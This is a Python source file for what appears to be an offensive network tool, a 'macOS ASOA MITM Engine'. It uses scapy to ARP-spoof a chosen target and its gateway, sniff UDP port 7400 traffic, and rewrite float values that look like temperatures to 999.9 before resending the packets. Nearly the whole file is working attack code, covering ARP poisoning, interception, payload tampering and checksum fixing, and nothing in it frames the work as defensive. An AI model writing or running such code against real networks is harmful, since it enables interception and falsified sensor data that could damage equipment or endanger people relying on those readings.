#!/usr/bin/env python3
"""
macOS ASOA MITM Engine
Specialized MITM engine for macOS targeting ASOA UDP communication on port 7400
"""

import sys
import time
import signal
import threading
import subprocess
import os
from scapy.all import *
import netifaces
import logging
from typing import Optional, Dict, Any

class MacOSASOAMITM:
    """
    macOS-specific ASOA MITM Engine
    Targets UDP port 7400 for ASOA communication
    """
    
    def __init__(self, logger: logging.Logger):
        self.logger = logger
        self.running = False
        self.target_ip = None
        self.gateway_ip = None
        self.interface = None
        self.intercepted_packets = 0
        self.modified_packets = 0
        self.arp_spoofing_active = False
        
    def get_gateway_ip(self) -> str:
        """Get default gateway IP"""
        try:
            gws = netifaces.gateways()
            return gws['default'][netifaces.AF_INET][0]
        except Exception as e:
            self.logger.error(f"Failed to get gateway IP: {e}")
            return None
    
    def get_interface(self) -> str:
        """Get default network interface"""
        try:
            # Get default interface
            gws = netifaces.gateways()
            interface = gws['default'][netifaces.AF_INET][1]
            return interface
        except Exception as e:
            self.logger.error(f"Failed to get interface: {e}")
            return None
    
    def arp_spoof(self):
        """ARP spoofing to intercept traffic between target and gateway"""
        self.logger.info("🔄 Starting ARP spoofing...")
        self.arp_spoofing_active = True
        
        try:
            # Spoof target to think we are gateway
            target_to_gateway = ARP(
                op=2,  # ARP reply
                psrc=self.gateway_ip,
                pdst=self.target_ip,
                hwsrc=get_if_hwaddr(self.interface)
            )
            
            # Spoof gateway to think we are target
            gateway_to_target = ARP(
                op=2,  # ARP reply
                psrc=self.target_ip,
                pdst=self.gateway_ip,
                hwsrc=get_if_hwaddr(self.interface)
            )
            
            while self.running and self.arp_spoofing_active:
                try:
                    send(target_to_gateway, verbose=False)
                    send(gateway_to_target, verbose=False)
                    time.sleep(2)
                except KeyboardInterrupt:
                    break
                except Exception as e:
                    self.logger.warning(f"ARP spoofing error: {e}")
                    time.sleep(1)
                    
        except Exception as e:
            self.logger.error(f"ARP spoofing failed: {e}")
        finally:
            self.arp_spoofing_active = False
    
    def packet_handler(self, packet):
        """Handle intercepted ASOA packets on UDP port 7400"""
        try:
            if packet.haslayer(UDP) and packet[UDP].dport == 7400:
                self.intercepted_packets += 1
                
                self.logger.info(f"📡 Intercepted ASOA packet #{self.intercepted_packets}: "
                               f"{packet[IP].src}:{packet[UDP].sport} -> "
                               f"{packet[IP].dst}:{packet[UDP].dport}")
                
                # Try to modify temperature data in the packet
                if self.modify_asoa_packet(packet):
                    self.modified_packets += 1
                    self.logger.info(f"🌡️ Temperature modified in packet #{self.intercepted_packets}")
                    
                    # Forward the modified packet
                    try:
                        send(packet, verbose=False)
                        self.logger.info(f"💉 Sent modified packet to {packet[IP].dst}:{packet[UDP].dport}")
                    except Exception as e:
                        self.logger.error(f"Failed to send modified packet: {e}")
                        
        except Exception as e:
            self.logger.error(f"Packet handler error: {e}")
    
    def modify_asoa_packet(self, packet) -> bool:
        """Modify temperature data in ASOA packet"""
        try:
            if packet.haslayer(Raw):
                payload = packet[Raw].load
                
                # Look for temperature patterns in the payload
                import struct
                import re
                
                # Try to find float values that could be temperature
                # ASOA uses ucdr serialization, so we look for 4-byte patterns
                float_pattern = re.compile(rb'[\x00-\xff]{4}')
                matches = float_pattern.findall(payload)
                
                for match in matches:
                    try:
                        # Try to interpret as float
                        value = struct.unpack('f', match)[0]
                        
                        # Check if it's in a reasonable temperature range (0-100°C)
                        if 0 <= value <= 100:
                            self.logger.info(f"🌡️ Found temperature value: {value}°C")
                            
                            # Replace with spoofed temperature (999.9°C)
                            spoofed_temp = 999.9
                            new_value = struct.pack('f', spoofed_temp)
                            new_payload = payload.replace(match, new_value)
                            
                            # Update packet payload
                            packet[Raw].load = new_payload
                            
                            # Recalculate checksums
                            del packet[UDP].chksum
                            del packet[IP].chksum
                            
                            return True
                            
                    except Exception as e:
                        continue
                        
        except Exception as e:
            self.logger.error(f"Error modifying packet: {e}")
        
        return False
    
    def start_attack(self, target_ip: str, spoofed_temp: float = 999.9) -> bool:
        """Start the MITM attack"""
        try:
            self.target_ip = target_ip
            self.gateway_ip = self.get_gateway_ip()
            self.interface = self.get_interface()
            
            if not self.gateway_ip or not self.interface:
                self.logger.error("❌ Failed to get gateway IP or interface")
                return False
            
            self.logger.info(f"🎯 Target: {self.target_ip}")
            self.logger.info(f"🌐 Gateway: {self.gateway_ip}")
            self.logger.info(f"🌡️ Spoofed Temperature: {spoofed_temp}°C")
            self.logger.info(f"📡 Interface: {self.interface}")
            
            self.running = True
            
            # Start ARP spoofing in background thread
            arp_thread = threading.Thread(target=self.arp_spoof)
            arp_thread.daemon = True
            arp_thread.start()
            
            # Wait a moment for ARP spoofing to take effect
            time.sleep(3)
            
            # Start packet sniffing on UDP port 7400
            self.logger.info("📡 Starting packet sniffing on UDP port 7400...")
            
            try:
                sniff(
                    filter=f"udp port 7400 and host {self.target_ip}",
                    prn=self.packet_handler,
                    store=0,
                    stop_filter=lambda x: not self.running
                )
            except KeyboardInterrupt:
                self.logger.info("🛑 Interrupt received")
            finally:
                self.stop_attack()
                
            return True
            
        except Exception as e:
            self.logger.error(f"❌ Failed to start attack: {e}")
            return False
    
    def stop_attack(self):
        """Stop the MITM attack and restore ARP tables"""
        self.logger.info("🛑 Stopping MITM attack...")
        self.running = False
        self.arp_spoofing_active = False
        
        # Restore ARP tables
        try:
            self.logger.info("🔄 Restoring ARP tables...")
            
            gateway_mac = getmacbyip(self.gateway_ip)
            target_mac = getmacbyip(self.target_ip)
            
            if gateway_mac and target_mac:
                # Restore target's ARP table
                restore_target = ARP(
                    op=2,
                    psrc=self.gateway_ip,
                    pdst=self.target_ip,
                    hwdst=target_mac,
                    hwsrc=gateway_mac
                )
                send(restore_target, verbose=False)
                
                # Restore gateway's ARP table
                restore_gateway = ARP(
                    op=2,
                    psrc=self.target_ip,
                    pdst=self.gateway_ip,
                    hwdst=gateway_mac,
                    hwsrc=target_mac
                )
                send(restore_gateway, verbose=False)
                
        except Exception as e:
            self.logger.warning(f"Failed to restore ARP tables: {e}")
        
        # Print attack summary
        self.logger.info(f"📊 Attack Summary:")
        self.logger.info(f"   - Intercepted packets: {self.intercepted_packets}")
        self.logger.info(f"   - Modified packets: {self.modified_packets}")
        self.logger.info("✅ MITM attack stopped")
    
    def get_status(self) -> Dict[str, Any]:
        """Get current attack status"""
        return {
            'running': self.running,
            'target_ip': self.target_ip,
            'gateway_ip': self.gateway_ip,
            'interface': self.interface,
            'intercepted_packets': self.intercepted_packets,
            'modified_packets': self.modified_packets,
            'arp_spoofing_active': self.arp_spoofing_active
        }
